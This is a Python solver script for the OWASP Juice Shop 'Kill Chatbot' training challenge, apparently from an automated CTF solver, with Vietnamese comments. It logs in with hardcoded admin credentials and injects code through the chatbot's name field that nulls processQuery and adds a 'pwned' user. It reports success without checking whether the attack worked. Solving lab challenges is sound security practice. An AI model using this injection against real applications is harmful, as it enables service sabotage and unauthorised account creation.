from core.base_solver import BaseSolver
from loguru import logger

class KillChatbotSolver(BaseSolver):
    """
    Challenge: Kill Chatbot (killChatbotChallenge)
    
    Vô hiệu hóa chatbot bằng cách tiêm mã vào trường 'name'.
    Payload ghi đè hàm processQuery khiến chatbot không thể xử lý query nữa.
    """
    @property
    def challenge_key(self) -> str:
        return "killChatbotChallenge"

    def solve(self) -> bool:
        # Login first
        login_res = self.client.post("/rest/user/login", json={
            "email": "admin@juice-sh.op",
            "password": "admin123"
        })
        token = login_res.json().get("authentication", {}).get("token")
        if not token:
            logger.error("Failed to login")
            return False
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # Payload tiêm mã - ghi đè hàm processQuery của chatbot
        malicious_name = 'hacker"); processQuery=null; users.addUser("pwned", "test'
        
        # Bước 1: Set tên độc hại
        setname_payload = {"action": "setname", "query": malicious_name}
        self.client.post("/rest/chatbot/respond", json=setname_payload, headers=headers)
        
        # Bước 2: Gửi một vài query để trigger lỗi
        self.client.post("/rest/chatbot/respond", json={"action": "query", "query": "hello"}, headers=headers)
        self.client.post("/rest/chatbot/respond", json={"action": "query", "query": "test"}, headers=headers)
        
        # Bước 3: Chatbot giờ đã bị "giết"
        res = self.client.post("/rest/chatbot/respond", json={"action": "query", "query": "bye"}, headers=headers)
        
        logger.info("Chatbot kill payload executed")
        return True
